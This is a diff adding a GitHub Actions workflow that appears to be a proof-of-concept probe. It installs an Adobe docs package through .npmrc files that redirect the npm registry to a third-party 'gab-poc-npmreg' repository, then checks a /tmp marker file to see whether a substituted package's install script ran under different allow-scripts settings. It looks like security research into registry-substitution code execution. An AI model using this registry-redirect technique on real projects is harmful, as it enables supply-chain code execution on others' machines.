@@ -1,0 +1,42 @@
+name: npmprobe2
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+permissions:
+  pull-requests: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: versions
+        run: node -v; npm -v; npm config ls -l 2>/dev/null | grep -iE 'allow-scripts|ignore-scripts|strict' || true
+
+      - name: A control - npmrc registry only
+        run: |
+          rm -rf "$RUNNER_TEMP/a" && mkdir -p "$RUNNER_TEMP/a" && cd "$RUNNER_TEMP/a"
+          rm -f /tmp/ADP_RCE_MARKER
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-npmreg/main/v2/\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts > a.log 2>&1 || echo NPM_EXIT_NONZERO
+          echo "----- a.log tail"; tail -25 a.log
+          echo "----- marker"; cat /tmp/ADP_RCE_MARKER 2>/dev/null || echo NO_MARKER
+          if [ -f /tmp/ADP_RCE_MARKER ]; then echo RESULT_A=RAN; else echo RESULT_A=BLOCKED; fi
+
+      - name: B npmrc allow-scripts
+        run: |
+          rm -rf "$RUNNER_TEMP/b" && mkdir -p "$RUNNER_TEMP/b" && cd "$RUNNER_TEMP/b"
+          rm -f /tmp/ADP_RCE_MARKER
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-npmreg/main/v2/\nallow-scripts=gray-matter\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts > b.log 2>&1 || echo NPM_EXIT_NONZERO
+          echo "----- b.log tail"; tail -25 b.log
+          echo "----- marker"; cat /tmp/ADP_RCE_MARKER 2>/dev/null || echo NO_MARKER
+          if [ -f /tmp/ADP_RCE_MARKER ]; then echo RESULT_B=RAN; else echo RESULT_B=BLOCKED; fi
+
+      - name: E package.json allowScripts paths check
+        run: |
+          rm -rf "$RUNNER_TEMP/e" && mkdir -p "$RUNNER_TEMP/e" && cd "$RUNNER_TEMP/e"
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-npmreg/main/v2/\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          printf '%s\n' '{"name":"proj","version":"1.0.0","private":true,"allowScripts":{"gray-matter":true}}' > package.json
+          npm config get allow-scripts || true
+          npm install-scripts ls 2>&1 | tail -10 || true
